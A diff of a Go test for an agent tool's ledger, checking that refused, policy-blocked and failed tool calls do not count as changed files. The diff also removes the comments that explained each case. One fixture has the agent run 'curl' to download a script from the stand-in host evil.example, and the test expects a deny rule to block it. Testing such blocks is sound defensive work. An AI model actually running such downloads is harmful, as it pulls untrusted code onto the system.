@@ -34,24 +34,24 @@ func TestObservedLedgerDoesNotCountRefusedCalls(t *testing.T) {
 	}
 
 	o := observeEvents([]event.Event{
-		// Refused by the permission mode: write, then the same via bash — the wave-10 shape.
+
 		call("c1", "write", `{"path":"x.txt","content":"hello"}`), denied("c1"),
 		result("c1", `write is unavailable in this headless run: permission mode "deny" cannot approve it`, true, false),
 		call("c2", "bash", `{"command":"echo \"hello\" > x.txt && cat x.txt"}`), denied("c2"),
 		result("c2", `bash is unavailable in this headless run: permission mode "deny" cannot approve it`, true, false),
-		// Blocked by policy, no permission event needed — the sentence is magi's own.
+
 		call("c3", "bash", `{"command":"curl https://evil.example/x > pull.sh"}`),
 		result("c3", "blocked by policy: matches deny rule", true, false),
-		// An edit that RAN and failed (anchor not found): it wrote nothing, so not "changed".
+
 		call("c4", "edit", `{"path":"y.txt","old":"a","new":"b"}`),
 		result("c4", "no match for old string", true, false),
-		// A write that LANDED and then failed diagnostics (IsError + Advisory): the file changed.
+
 		call("c5", "write", `{"path":"ok.go","content":"pkg"}`),
 		result("c5", "wrote 3 bytes\n\n[diagnostics]\nexpected 'package'", true, true),
-		// A bash that ran and failed (exit 1): it RAN, so it belongs in commands.
+
 		call("c6", "bash", `{"command":"go test ./broken"}`),
 		result("c6", "exit 1\nFAIL", true, false),
-	})
+	}, nil)
 
 	for _, p := range []string{"x.txt", "pull.sh", "y.txt"} {
 		for _, c := range o.changed {
